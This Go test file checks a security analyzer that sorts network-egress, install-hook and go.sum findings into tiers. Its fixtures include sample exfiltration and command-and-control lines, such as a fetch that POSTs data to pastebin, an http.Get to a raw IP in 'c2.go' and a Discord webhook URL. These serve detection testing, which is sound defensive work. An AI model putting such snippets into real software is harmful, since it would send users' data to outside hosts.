package intent

import (
	"strings"
	"testing"

	"github.com/user/safeanalyze/pkg/report"
)

func tierOf(findings []report.Finding, rule string) string {
	best := ""
	for _, f := range findings {
		if f.RuleID == rule && (best == "" || f.Tier < best) {
			best = f.Tier
		}
	}
	return best
}

func TestEgressDistinguishesCodeFromData(t *testing.T) {
	cases := []struct {
		name, rel, content, rule, want string
	}{
		{"raw IP in a comment", "bn256/gfp.go", "package bn256\n// ftp://136.206.11.249/pub/crypto/pairings.pdf\nfunc f() { http.Get(u) }\n", "egress_raw_ip", report.TierB},
		{"raw IP used by code", "c2.go", "package c2\nconst u = \"http://45.9.148.12:8080/c\"\nfunc f() { http.Get(u) }\n", "egress_raw_ip", report.TierA},
		{"exfil host in data without calls", "data/icons.json", `{"slug":"pastebin","source":"https://pastebin.com/"}`, "egress_exfil", report.TierB},
		{"exfil host used by code", "x.js", "const u='https://pastebin.com/api/api_post.php';\nfetch(u,{method:'POST',body:d});\n", "egress_exfil", report.TierA},
		{"webhook token without call site", "cfg.json", `{"hook":"https://discord.com/api/webhooks/123456789/abcdefghijklmnopqrstuvwxyz"}`, "egress_exfil", report.TierA},
		{"telemetry host far from a call in a minified line", "index.js", strings.Repeat("a", 2000) + `"https://posthog.com/"` + strings.Repeat("b", 2000) + `fetch(x)`, "egress_telemetry", report.TierB},
		{"telemetry host next to a call in a minified line", "index.js", strings.Repeat("a", 2000) + `;fetch("https://eu.posthog.com/e",{body:d})` + strings.Repeat("b", 2000), "egress_telemetry", report.TierA},
	}
	for _, c := range cases {
		got := tierOf(analyzeEgress([]*File{NewFile(c.rel, c.content)}), c.rule)
		if got != c.want {
			t.Errorf("%s: %s tier %q, want %q", c.name, c.rule, got, c.want)
		}
	}
}

func TestTelemetrySDKNeedsImport(t *testing.T) {
	data := NewFile("index.js", `module.exports={"posthog":{"title":"PostHog"},"rollbar":{"title":"Rollbar"}};`)
	if f := analyzeEgress([]*File{data}); tierOf(f, "telemetry_sdk") != "" {
		t.Errorf("SDK name in data reported as telemetry SDK: %+v", f)
	}
	code := NewFile("app.ts", "import posthog from \"posthog-js\";\nposthog.init(\"phc_x\");\n")
	if tierOf(analyzeEgress([]*File{code}), "telemetry_sdk") != report.TierA {
		t.Error("imported, unguarded telemetry SDK not Tier A")
	}
}

func TestDependencyPrepareScriptIgnored(t *testing.T) {
	pkg := `{"name":"x","scripts":{"prepare":"node build.js","postinstall":"node setup.js"}}`
	dep := depFile("deps/npm/x@1.0.0/", "package.json", []byte(pkg))
	got := map[string]bool{}
	for _, f := range analyzeAutorun([]*File{dep}) {
		got[f.Match[:strings.Index(f.Match, ":")]] = true
	}
	if got[`"prepare"`] || !got[`"postinstall"`] {
		t.Errorf("dependency lifecycle findings = %v, want postinstall only", got)
	}
}

func TestGoBuildInput(t *testing.T) {
	for rel, want := range map[string]bool{
		"client.go": true, "asm_amd64.s": true, "LICENSE": true,
		".github/workflows/build.yml": false, ".devcontainer/devcontainer.json": false,
		"internal/quic/cmd/interop/Dockerfile": false, "testdata/x.go": false, "docs/LICENSE": false,
	} {
		if got := goBuildInput(rel); got != want {
			t.Errorf("goBuildInput(%q) = %v, want %v", rel, got, want)
		}
	}
}

func TestGoSumCheckFollowsReplace(t *testing.T) {
	mod := NewFile("go.mod", "module a\n\nrequire (\n\tgithub.com/up/lib v1.0.0\n\tgithub.com/up/missing v1.0.0\n\tgithub.com/loc/y v0.1.0\n)\n\nreplace github.com/up/lib => github.com/fork/lib v1.0.1\nreplace github.com/loc/y => ../y\n")
	sum := NewFile("go.sum", "github.com/fork/lib v1.0.1 h1:x=\ngithub.com/fork/lib v1.0.1/go.mod h1:y=\n")
	var missing []string
	for _, f := range analyzeDepSource([]*File{mod, sum}) {
		if f.RuleID == "dep_go_sum_entry_missing" {
			missing = append(missing, f.Match)
		}
	}
	if len(missing) != 1 || !strings.Contains(missing[0], "github.com/up/missing") {
		t.Errorf("missing go.sum entries = %v, want only github.com/up/missing", missing)
	}
}
